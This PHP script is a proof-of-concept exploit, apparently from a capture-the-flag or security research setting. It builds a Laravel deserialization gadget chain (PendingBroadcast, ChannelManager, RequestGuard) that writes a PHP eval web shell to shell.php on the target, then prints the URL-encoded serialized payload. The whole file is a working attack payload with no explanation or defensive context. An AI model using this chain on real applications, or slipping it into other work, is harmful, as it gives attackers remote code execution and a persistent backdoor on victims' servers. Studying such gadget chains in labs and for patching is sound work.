<?php
/*
# -*- coding: utf-8 -*-
# @filename: pop2-webshell.php
# @author: diggid
*/
namespace Illuminate\Notifications{
    //use Illuminate\Support\Manager;
    class ChannelManager{
        protected $customCreators;
        protected $drivers = array(); //should not have key "diggid"
        protected $defaultChannel = "diggid";
        public function __construct($a)
        {
            $this->customCreators = array("diggid" => "call_user_func");
            $this->container = array($a, "user");
        }
    }
}

namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Illuminate\Auth{
    class RequestGuard{
        protected $user = null;
        protected $callback = "file_put_contents";
        protected $request = "./shell.php";
        //protected $request = "/var/www/html/shell.php";
        protected $provider = '<?php @eval($_REQUEST[diggid]);?>';
    }
}
namespace {
    $c = new Illuminate\Auth\RequestGuard;
    $b = new Illuminate\Notifications\ChannelManager($c);
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, "diggid");
    echo urlencode(serialize($a));
}
